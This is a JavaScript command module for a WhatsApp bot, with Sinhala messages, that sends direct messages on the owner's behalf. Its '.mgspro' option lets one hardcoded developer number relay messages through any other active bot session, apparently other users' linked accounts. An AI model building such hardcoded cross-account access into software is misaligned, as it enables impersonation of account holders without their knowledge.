module.exports = {
  name: "msg",
  alias: ["mgs", "send", "dm", "mgspro", "switchmsg"],
  description: "Direct message & Cross-bot relay controller",

  async execute({ sock, msg, from, args, body, activeBots }) {
    try {
      // 1. Sender Identification
      const senderJid = msg.key.fromMe 
        ? (sock.user?.id || "") 
        : (msg.key.participant || msg.participant || from || "");

      const cleanSender = senderJid.split("@")[0].split(":")[0].replace(/[^0-9]/g, "");

      // Developer & Owner Whitelist
      const devNumbers = ["94719845166"];
      const isDeveloper = devNumbers.some(num => cleanSender.includes(num)) || senderJid.includes("15947733680169");
      const isOwner = msg.key.fromMe || isDeveloper;

      // Command Type
      const commandTrigger = body.slice(1).trim().split(/ +/)[0].toLowerCase();
      const isPro = commandTrigger === "mgspro" || commandTrigger === "switchmsg";

      // -------------------------------------------------------------
      // OPTION A: .mgspro (Cross-Node Relay)
      // -------------------------------------------------------------
      if (isPro) {
        if (!isDeveloper) {
          sock.sendMessage(from, { react: { text: "🚫", key: msg.key } }).catch(() => {});
          return await sock.sendMessage(from, {
            text: "*⛔ ACCESS DENIED ⛔*\n\n.mgspro පාවිච්චි කළ හැක්කේ Developer ට පමණි."
          }, { quoted: msg });
        }

        const fullText = args.join(" ").trim();
        const parts = fullText.split(",");

        if (parts.length < 3) {
          return await sock.sendMessage(from, {
            text: "*⚠️ MGSPRO භාවිතය:*\n.mgspro <sender_bot_number>,<receiver_number>,<message>\n\n*උදා:* .mgspro 94771033094,94719845166,හෙලෝ"
          }, { quoted: msg });
        }

        let senderNum = parts[0].replace(/[^0-9]/g, "");
        if (senderNum.startsWith("0")) senderNum = "94" + senderNum.slice(1);

        let targetNum = parts[1].replace(/[^0-9]/g, "");
        if (targetNum.startsWith("0")) targetNum = "94" + targetNum.slice(1);

        const textToSend = parts.slice(2).join(",").trim();

        if (!textToSend) {
          return await sock.sendMessage(from, { text: "⚠️ Message එකක් ඇතුළත් කරන්න." }, { quoted: msg });
        }

        sock.sendMessage(from, { react: { text: "⚡", key: msg.key } }).catch(() => {});

        // Match Bot Instance
        let relaySock = null;
        let matchedNode = null;

        if (activeBots) {
          for (const [nodeId, bot] of activeBots.entries()) {
            const botPhone = (bot?.user?.id || "").split("@")[0].split(":")[0].replace(/[^0-9]/g, "");
            if (botPhone === senderNum || nodeId.includes(senderNum)) {
              relaySock = bot;
              matchedNode = nodeId;
              break;
            }
          }
        }

        if (!relaySock) {
          sock.sendMessage(from, { react: { text: "❌", key: msg.key } }).catch(() => {});
          return await sock.sendMessage(from, {
            text: `*❌ Node Offline!*\n+${senderNum} අංකයට අදාළ Bot active නැත.`
          }, { quoted: msg });
        }

        const targetJid = `${targetNum}@s.whatsapp.net`;
        await relaySock.sendMessage(targetJid, { text: textToSend });

        await sock.sendMessage(from, {
          text: `*🚀 RELAY SUCCESS*\n\n🤖 *Node:* +${senderNum} [${matchedNode}]\n🎯 *To:* +${targetNum}\n💬 *Message:* ${textToSend}`
        }, { quoted: msg });

        return sock.sendMessage(from, { react: { text: "🖤", key: msg.key } }).catch(() => {});
      }

      // -------------------------------------------------------------
      // OPTION B: .msg (Direct Send via Current Bot)
      // -------------------------------------------------------------
      if (!isOwner) {
        sock.sendMessage(from, { react: { text: "🚫", key: msg.key } }).catch(() => {});
        return await sock.sendMessage(from, {
          text: "*⛔ ACCESS DENIED ⛔*\nමෙම විධානය Owner හට පමණි."
        }, { quoted: msg });
      }

      const fullText = args.join(" ").trim();
      if (!fullText.includes(",")) {
        return await sock.sendMessage(from, {
          text: "*⚠️ MSG භාවිතය:*\n.msg <number>,<message>\n\n*උදා:* .msg 94719845166,මොකද කරන්නෙ?"
        }, { quoted: msg });
      }

      const [rawNumber, ...contentParts] = fullText.split(",");
      let targetNumber = rawNumber.replace(/[^0-9]/g, "");
      if (targetNumber.startsWith("0")) targetNumber = "94" + targetNumber.slice(1);

      const messageContent = contentParts.join(",").trim();

      if (!messageContent) {
        return await sock.sendMessage(from, { text: "⚠️ Message එකක් ලියන්න." }, { quoted: msg });
      }

      sock.sendMessage(from, { react: { text: "⏳", key: msg.key } }).catch(() => {});

      const targetJid = `${targetNumber}@s.whatsapp.net`;

      // Safe Send
      await sock.sendMessage(targetJid, { text: messageContent });

      await sock.sendMessage(from, {
        text: `*⚡ TRANSMISSION COMPLETE ⚡*\n\n🎯 *To:* +${targetNumber}\n💬 *Message:* ${messageContent}`
      }, { quoted: msg });

      sock.sendMessage(from, { react: { text: "✅", key: msg.key } }).catch(() => {});

    } catch (err) {
      console.error("[MSG RUNTIME ERROR]:", err);
      sock.sendMessage(from, { react: { text: "❌", key: msg.key } }).catch(() => {});
      await sock.sendMessage(from, {
        text: `❌ යැවීමට නොහැකි විය: ${err.message || "Unknown Network Error"}`
      }, { quoted: msg });
    }
  }
};
